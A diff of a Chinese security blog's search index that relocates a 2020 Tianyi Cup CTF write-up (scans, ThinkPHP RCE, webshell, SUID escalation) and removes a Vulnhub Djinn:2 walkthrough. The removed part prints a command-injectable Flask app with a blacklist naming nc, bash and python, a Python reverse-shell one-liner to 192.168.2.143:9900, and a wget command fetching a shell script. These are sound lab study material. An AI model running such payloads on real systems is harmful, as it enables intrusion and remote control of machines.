@@ -33,78 +33,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Jacobi_fly天翼杯2020WP</title>
-    <url>//Jacobi_fly.html</url>
-    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
-<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
-<a id="more"></a>
-
-
-
-<p><strong>0xDktb师傅太强了</strong></p>
-<p><strong>XZLang师傅太强了</strong></p>
-<p><strong>我是废物</strong></p>
-<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />
-
-
-
-<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
-<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
-<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
-<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
-<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>
-
-<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
-<p>得到flag18 </p>
-<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
-<p><code>robots.txt</code> 文件直接给flag7 </p>
-<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>
-
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
-<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
-<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
-<p>flag5需要root权限， </p>
-<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
-<p>用冰蝎连接查询flag: </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
-<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
-<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
-<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
-<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
-<ul>
-<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
-</li>
-<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
-</li>
-<li><p>XZLang师傅也很NB</p>
-</li>
-<li><p><font color='red'>只有我是废物呜呜呜</font></p>
-</li>
-</ul>
-<p>​    </p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>天翼杯</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>URLDNS 分析</title>
     <url>//URLDNS.html</url>
     <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>URLDNS.java</code>利用链分析，跟踪调试。</p>
@@ -184,6 +112,78 @@
       <tags>
         <tag>JavaWeb</tag>
         <tag>ysoserial</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jacobi_fly天翼杯2020WP</title>
+    <url>//Jacobi_fly.html</url>
+    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
+<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
+<a id="more"></a>
+
+
+
+<p><strong>0xDktb师傅太强了</strong></p>
+<p><strong>XZLang师傅太强了</strong></p>
+<p><strong>我是废物</strong></p>
+<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />
+
+
+
+<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
+<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
+<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
+<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
+<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>
+
+<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
+<p>得到flag18 </p>
+<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
+<p><code>robots.txt</code> 文件直接给flag7 </p>
+<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
+<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
+<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
+<p>flag5需要root权限， </p>
+<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
+<p>用冰蝎连接查询flag: </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
+<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
+<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
+<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
+<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
+<ul>
+<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
+</li>
+<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
+</li>
+<li><p>XZLang师傅也很NB</p>
+</li>
+<li><p><font color='red'>只有我是废物呜呜呜</font></p>
+</li>
+</ul>
+<p>​    </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>天翼杯</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -565,117 +565,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub Djinn:2靶机</title>
-    <url>//Djinn-2.html</url>
-    <content><![CDATA[<p>vulnhub里的 Djinn:2 靶机</p>
-<p>中等难度</p>
-<a id="more"></a>
-
-
-
-<h1 id="Djinn-2"><a href="#Djinn-2" class="headerlink" title="Djinn:2"></a>Djinn:2</h1><img src="Djinn:2/image-20200720161617553.png" alt="image-20200720161617553" style="zoom:50%;" />
-
-
-
-<p>开启了<code>21 22 1337 5000 7331</code>端口</p>
-<p>其中<code>1337端口</code> 也是一个小游戏，这回没有去玩（之后可以试试）</p>
-<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>老三样</p>
-<img src="Djinn:2/image-20200720164826449.png" alt="image-20200720164826449" style="zoom:50%;" />
-
-<p>这玩意很像是密码？但是ssh不对（在后面用到了）</p>
-<h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>7331端口访问之后还是老样子</p>
-<img src="Djinn:2/image-20200720162014809.png" alt="image-20200720162014809" style="zoom:50%;" />
-
-<p><code>/wish</code>已经修复</p>
-<img src="Djinn:2/image-20200720162039152.png" alt="image-20200720162039152" style="zoom:33%;" />
-
-
-
-<p><code>robots.txt</code>里面只写了一个<code>/letshack</code>（并没有什么卵用）</p>
-<p>目录扫描还有一个<code>/source</code></p>
-<p>下载下来之后是一个python文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://&#123;&#125;:5000/?username=&#123;&#125;&amp;password=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span>(<span class="params">ip: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check whether the input IP is valid or not</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">r&#x27;^(?:(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&#x27;</span></span><br><span class="line">                <span class="string">&#x27;(\.(?!$)|$))&#123;4&#125;$&#x27;</span>, ip):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catcher</span>(<span class="params">host, username, password</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = URL.<span class="built_in">format</span>(host, username, password)</span><br><span class="line">        requests.post(url)</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">&quot;Unable to connect to the server!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;If you have this then congratulations on being a part of an awesome organization&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;This key will help you in connecting to our system securely.&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;If you find any issue please report it to ugtan@djinn.io&quot;</span>)</span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;\nIP of the machine: &#x27;</span>)</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&#x27;Your username: &#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Your password: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">and</span> check_ip(ip) <span class="keyword">and</span> username == <span class="string">&quot;REDACTED&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;REDACTED&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;Verifiying %s with host %s &quot;</span> % (username, ip))</span><br><span class="line">        catcher(ip, username, password)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid IP address given&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>那估计考点就是5000端口了</p>
-<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>分析source文件可知 5000端口用的是post方法，尝试抓个包</p>
-<img src="Djinn:2/image-20200720163202232.png" alt="image-20200720163202232" style="zoom:50%;" />
-
-<p>在<code>username</code>变量存在<code>RCE</code></p>
-<img src="Djinn:2/image-20200720163255638.png" alt="image-20200720163255638" style="zoom:50%;" />
-
-<p><strong>app.py</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line">RCE = [<span class="string">&quot;|&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;nc&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;eval&quot;</span>,  <span class="string">&quot;python&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> RCE:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    command = request.args.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> validate(command):</span><br><span class="line">        output = subprocess.Popen(command, shell=<span class="literal">True</span>,</span><br><span class="line">                                  stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">&quot;Access Denied!!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>看样子过滤了一些命令，可以用wget上传文件来绕过</p>
-<p>使用的payload为(因为靶机上面的nc 没有<code>-e</code>参数，python版本为<code>python3</code>)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.143&quot;, 9900));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>使用<code>wget+-O+/tmp/a.sh+http://192.168.2.143/shell</code></p>
-<img src="Djinn:2/image-20200720163942603.png" alt="image-20200720163942603" style="zoom:25%;" />
-
